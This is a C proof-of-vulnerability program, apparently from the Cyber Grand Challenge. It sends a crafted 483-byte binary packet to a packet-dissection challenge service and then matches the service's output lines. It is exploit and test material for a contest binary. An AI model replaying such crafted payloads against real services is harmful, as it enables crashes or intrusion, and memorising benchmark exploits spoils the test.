#include "libpov.h"
int main(int cgc_argc, char *cgc_argv[]) {
   cgc_negotiate_type1(0x0, 0x0, 0);
   do {
      //*** writing data
      static unsigned char write_00000_00000[] = 
         "\xe3\x01\x00\x00";
      static unsigned int write_00000_00000_len = 4;
      unsigned char *write_00000 = NULL;
      unsigned int write_00000_len = 0;
      write_00000 = cgc_append_buf(write_00000, &write_00000_len, write_00000_00000, write_00000_00000_len);
      if (write_00000_len > 0) {
         cgc_transmit_all(1, write_00000, write_00000_len);
      }
      cgc_free(write_00000);
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00001_00000[] = 
         "\x01\x00\x00\x00\x00\x00\x00\x00\xcb\x01\x00\x00\xc3\x01\x00\x00"
         "\x00\x00\x00\x00\x10\x01\x10\x10\x00\x00\x00\x00\xc3\x01\x00\x00"
         "\xe0\xdb\x1b\xd9\xb8\x97\x1f\x78\x40\xfe\xf3\x0b\xa7\xd8\x76\xc8"
         "\xf2\xa4\xbc\xce\x3b\x00\x00\x00\x30\x57\x01\x00\x0d\x41\x00\x01"
         "\xf3\x6e\x11\x82\x20\xf4\xda\xa0\x2b\xb8\x38\xf3\xea\x4e\x05\xbe"
         "\x87\x5d\xff\x01\x00\x6b\xa4\x5e\xad\xaf\x90\x3c\x6e\x97\x71\x1e"
         "\xb1\x45\x58\x8c\x01\x22\x75\xc9\x70\x34\xb0\x69\x63\xf0\x80\x70"
         "\x51\xd1\xb3\x3c\x9b\x8d\x35\x28\x00\x4c\x1e\x7c\xd7\x83\x81\x01"
         "\x35\x97\x97\x7b\x6c\x8f\x9f\xf5\x0a\x97\x16\x83\xfd\xfe\x70\xca"
         "\xf1\x8e\x33\x71\x53\xc1\x75\x5b\xee\xd3\x6c\x01\x00\xd5\xe6\x34"
         "\xa7\xd4\x6e\x1d\x01\xd6\xff\xaa\x6a\x51\x1b\xe6\xe8\x3d\x40\xf6"
         "\x12\x59\x16\x0e\x16\x6e\xc2\x68\x07\x2d\x62\x4e\x2c\x98\xc9\x63"
         "\x91\x34\x69\x44\x95\x21\x00\xaa\xeb\x2d\x4d\x09\xbc\x38\x29\xed"
         "\x5e\xa6\x94\x31\x2c\xa1\xb9\x33\x9e\x27\xde\x73\x8a\x24\xd1\xd7"
         "\x64\xc3\xa0\x64\xdb\xcb\x42\xac\x3a\x6d\xe7\x11\xb3\x6f\x3f\x60"
         "\x69\x50\xab\xd3\xe2\x36\x5d\x3c\x13\x45\x91\x06\x3e\xb0\xcd\x57"
         "\x48\x5e\x70\xaf\xab\x2f\xeb\x03\xce\x43\x31\x4b\x97\xbb\x5f\x10"
         "\xee\x29\xd5\xe4\x23\x05\x43\x5d\xbc\x8b\xf4\xdb\xfe\xf7\x96\x1c"
         "\x49\xee\x66\x47\x42\xf9\xcc\xbd\x35\x11\x08\xef\x78\xf5\xb8\x3a"
         "\x56\xea\xd8\xf7\x71\x92\x02\x92\x2b\xc0\x80\x44\x53\x77\xd2\x22"
         "\xbf\xe3\x1d\xd6\xc7\x41\xa6\xaa\x2f\x1b\x16\xa3\x0f\x96\x3f\xb8"
         "\xd4\x4c\x8c\xbb\x7a\xc0\x9c\x4c\xbb\x98\xb1\xc5\x77\xe1\x9f\xaa"
         "\x99\x07\xef\xe5\x91\xd0\xe1\x8a\xa6\x19\xae\x7e\x6e\xce\x1a\x81"
         "\xbe\xc5\x3a\x07\x89\x38\xb6\x3a\x72\x3e\x2e\xa6\x85\x87\xf3\x97"
         "\x6b\x5a\x2f\x49\x3c\xcf\xdd\x44\x6d\x84\x7f\xdc\xad\x4e\x18\x06"
         "\x44\x83\x4e\x7b\x4a\xcb\x55\x05\x6a\x34\x5b\x16\x0b\x82\x8c\xc3"
         "\x79\x09\x04\x32\x01\x7a\x78\x7a\x0b\x92\xca\x8d\xdf\x67\xd9\x53"
         "\x1c\x8b\x30\x02\x9d\xb0\x7f\xea\x25\xe7\x01\x00\xb2\x41\x00\xd7"
         "\xcb\xd1\x01\x2d\x62\x74\x29\x01\x78\x39\x40\xaf\xfe\xd1\xfe\x60"
         "\x27\xab\xd3\x5a\x7c\xcf\x25\x03\x2c\xc8\xf7\xd4\xb5\x90\x94\xca"
         "\x2a\xf4\x81";
      static unsigned int write_00001_00000_len = 483;
      unsigned char *write_00001 = NULL;
      unsigned int write_00001_len = 0;
      write_00001 = cgc_append_buf(write_00001, &write_00001_len, write_00001_00000, write_00001_00000_len);
      if (write_00001_len > 0) {
         cgc_transmit_all(1, write_00001, write_00001_len);
      }
      cgc_free(write_00001);
   } while (0);
   do {
      unsigned char *read_00000;
      unsigned int read_00000_len;
      unsigned int read_00000_ptr = 0;
      //**** delimited read
      static unsigned char read_00000_delim[] = 
         "\x0a";
      read_00000 = NULL;
      read_00000_len = 0;
      int read_00000_res = cgc_delimited_read(0, &read_00000, &read_00000_len, read_00000_delim, 1);
      if (read_00000_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00000_00000[] = 
         "\x53\x74\x61\x72\x74\x69\x6e\x67\x20\x64\x69\x73\x73\x65\x63\x74"
         "\x69\x6f\x6e\x2e\x2e\x2e";
      read_00000_ptr += cgc_data_match(read_00000 + read_00000_ptr, read_00000_len - read_00000_ptr, match_00000_00000, 22);
      cgc_free(read_00000);
      if (read_00000_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00001;
      unsigned int read_00001_len;
      unsigned int read_00001_ptr = 0;
      //**** delimited read
      static unsigned char read_00001_delim[] = 
         "\x3d\x3d\x3d\x3d\x0a";
      read_00001 = NULL;
      read_00001_len = 0;
      int read_00001_res = cgc_delimited_read(0, &read_00001, &read_00001_len, read_00001_delim, 5);
      if (read_00001_res) {} //silence unused variable warning
      /* read match pcre:
.*New Packet
*/
      static char read_00001_00000_regex[] = 
         "\x2e\x2a\x4e\x65\x77\x20\x50\x61\x63\x6b\x65\x74";
      static match_result read_00001_00000_match;
      pcre *read_00001_00000_pcre = cgc_init_regex(read_00001_00000_regex);
      if (read_00001_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00001_00000_pcre, 0, read_00001 + read_00001_ptr, read_00001_len - read_00001_ptr, &read_00001_00000_match);
         if (rc > 0) {
            read_00001_ptr += read_00001_00000_match.match_end - read_00001_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00001_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00001);
      if (read_00001_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00002;
      unsigned int read_00002_len;
      unsigned int read_00002_ptr = 0;
      //**** delimited read
      static unsigned char read_00002_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00002 = NULL;
      read_00002_len = 0;
      int read_00002_res = cgc_delimited_read(0, &read_00002, &read_00002_len, read_00002_delim, 4);
      if (read_00002_res) {} //silence unused variable warning
      /* read match pcre:
.*===llama
*/
      static char read_00002_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x6c\x6c\x61\x6d\x61";
      static match_result read_00002_00000_match;
      pcre *read_00002_00000_pcre = cgc_init_regex(read_00002_00000_regex);
      if (read_00002_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00002_00000_pcre, 0, read_00002 + read_00002_ptr, read_00002_len - read_00002_ptr, &read_00002_00000_match);
         if (rc > 0) {
            read_00002_ptr += read_00002_00000_match.match_end - read_00002_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00002_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00002);
      if (read_00002_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00003;
      unsigned int read_00003_len;
      unsigned int read_00003_ptr = 0;
      //**** delimited read
      static unsigned char read_00003_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00003 = NULL;
      read_00003_len = 0;
      int read_00003_res = cgc_delimited_read(0, &read_00003, &read_00003_len, read_00003_delim, 4);
      if (read_00003_res) {} //silence unused variable warning
      /* read match pcre:
.*===llamaintracutaneous
*/
      static char read_00003_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x6c\x6c\x61\x6d\x61\x69\x6e\x74\x72\x61\x63"
         "\x75\x74\x61\x6e\x65\x6f\x75\x73";
      static match_result read_00003_00000_match;
      pcre *read_00003_00000_pcre = cgc_init_regex(read_00003_00000_regex);
      if (read_00003_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00003_00000_pcre, 0, read_00003 + read_00003_ptr, read_00003_len - read_00003_ptr, &read_00003_00000_match);
         if (rc > 0) {
            read_00003_ptr += read_00003_00000_match.match_end - read_00003_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00003_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00003);
      if (read_00003_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00004;
      unsigned int read_00004_len;
      unsigned int read_00004_ptr = 0;
      //**** delimited read
      static unsigned char read_00004_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00004 = NULL;
      read_00004_len = 0;
      int read_00004_res = cgc_delimited_read(0, &read_00004, &read_00004_len, read_00004_delim, 4);
      if (read_00004_res) {} //silence unused variable warning
      /* read match pcre:
.*Dissection finished
*/
      static char read_00004_00000_regex[] = 
         "\x2e\x2a\x44\x69\x73\x73\x65\x63\x74\x69\x6f\x6e\x20\x66\x69\x6e"
         "\x69\x73\x68\x65\x64";
      static match_result read_00004_00000_match;
      pcre *read_00004_00000_pcre = cgc_init_regex(read_00004_00000_regex);
      if (read_00004_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00004_00000_pcre, 0, read_00004 + read_00004_ptr, read_00004_len - read_00004_ptr, &read_00004_00000_match);
         if (rc > 0) {
            read_00004_ptr += read_00004_00000_match.match_end - read_00004_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00004_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00004);
      if (read_00004_ptr) {}  //silence unused variable warning if any
   } while (0);
}
